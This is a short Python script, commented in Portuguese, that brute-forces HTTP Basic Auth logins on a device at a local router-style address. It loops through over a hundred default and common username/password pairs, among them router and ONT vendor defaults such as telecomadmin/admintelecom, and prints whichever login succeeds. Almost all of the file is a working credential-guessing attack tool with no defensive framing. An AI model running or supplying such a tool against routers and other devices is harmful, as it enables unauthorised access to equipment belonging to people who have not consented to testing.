#Brute force c/ user e pwd pré-definidos
#Só funciona na conexão http

import subprocess
import sys

# Verifica e instala requests se necessário
def install_requests():
    try:
        import requests
    except ImportError:
        print("Instalando a biblioteca requests...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
    return requests

requests = install_requests()
from requests.auth import HTTPBasicAuth

def test_login(url, credentials):
    for username, password in credentials:
        response = requests.get(url, auth=HTTPBasicAuth(username, password))
        
        if response.status_code == 200:
            print(f"[+] Login bem-sucedido: {username}:{password}")
            return (username, password)
        else:
            print(f"[-] Falha: {username}:{password}")
    
    print("Nenhuma credencial funcionou.")
    return None

# Configuração
url = "http://192.168.1.1:8080"
credenciais = [
    ("admin", "admin"),
    ("admin", "1234"),
    ("root", "root"),
    ("user", "password"),
    ("admin", "password"),
    ("admin", "fkw123"),
    ("support", "fkw@123"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("superadmin", "superadmin"),
    ("root", "admin"),
    ("admin", "root"),
    ("admin", "default"),
    ("admin", "12345"),
    ("admin", "pass"),
    ("admin", "0000"),
    ("admin", "4321"),
    ("admin", "admin1"),
    ("admin", "letmein"),
    ("admin", "changeme"),
    ("admin", "qwerty"),
    ("admin", "123admin"),
    ("admin", "welcome"),
    ("admin", "password1"),
    ("admin", "p@ssw0rd"),
    ("admin", "passw0rd"),
    ("user", "user"),
    ("user", "user123"),
    ("user", "12345678"),
    ("admin", "admin@123"),
    ("admin", "administrator"),
    ("administrator", "admin"),
    ("super", "super"),
    ("admin", "!admin"),
    ("root", "toor"),
    ("guest", "guest"),
    ("guest", "12345"),
    ("support", "support"),
    ("support", "support123"),
    ("manager", "manager"),
    ("manager", "manager123"),
    ("root", "password"),
    ("root", "1234"),
    ("root", "123456"),
    ("root", "root123"),
    ("root", "default"),
    ("root", "abc123"),
    ("root", "system"),
    ("root", "pass123"),
    ("root", "12345"),
    ("root", "admin123"),
    ("ont", "ont"),
    ("telecomadmin", "admintelecom"),
    ("telecom", "telecom"),
    ("admin", "1q2w3e"),
    ("admin", "1qaz2wsx"),
    ("admin", "654321"),
    ("admin", "7890"),
    ("admin", "1111"),
    ("admin", "9999"),
    ("admin", "123456789"),
    ("admin", "abc123"),
    ("admin", "admin@admin"),
    ("admin", "1admin"),
    ("admin", "adminpass"),
    ("root", "987654321"),
    ("root", "741852963"),
    ("admin", "pass1234"),
    ("admin", "qwerty123"),
    ("admin", "admin999"),
    ("admin", "test"),
    ("admin", "super"),
    ("admin", "secure"),
    ("admin", "monkey"),
    ("admin", "trustno1"),
    ("admin", "admin!"),
    ("admin", "password123"),
    ("admin", "p@ssword"),
    ("admin", "passw0rd123"),
    ("admin", "adminpass123"),
    ("admin", "adminpassword"),
    ("admin", "pa$$word"),
    ("admin", "letmein123"),
    ("admin", "123admin321"),
    ("admin", "admin007"),
    ("admin", "admin000"),
    ("admin", "login"),
    ("admin", "321admin"),
    ("admin", "passcode"),
    ("admin", "adminsecure"),
    ("admin", "admlogin"),
    ("admin", "adm123"),
    ("admin", "admin0000"),
    ("admin", "master"),
    ("admin", "unlock"),
    ("admin", "goaway"),
    ("admin", "god"),
    ("admin", "welcome123"),
    ("admin", "hello"),
    ("admin", "iloveyou"),
    ("admin", "123qwe"),
    ("admin", "qwe123"),
    ("admin", "123qwerty"),
    ("admin", "admin!@#"),
    ("admin", "admin_123"),
    ("admin", "admin-123"),
    ("admin", "admin.admin"),
    ("admin", "admin+123"),
    ("admin", "default123"),
    ("admin", "defaultpass"),
    ("admin", "defaultpassword"),
    ("admin", "changeit"),
    ("admin", "setup"),
    ("admin", "start"),
    ("admin", "loginadmin"),
    ("admin", "admin4u"),
    ("admin", "adminonly"),
]

# Execução
test_login(url, credenciais)
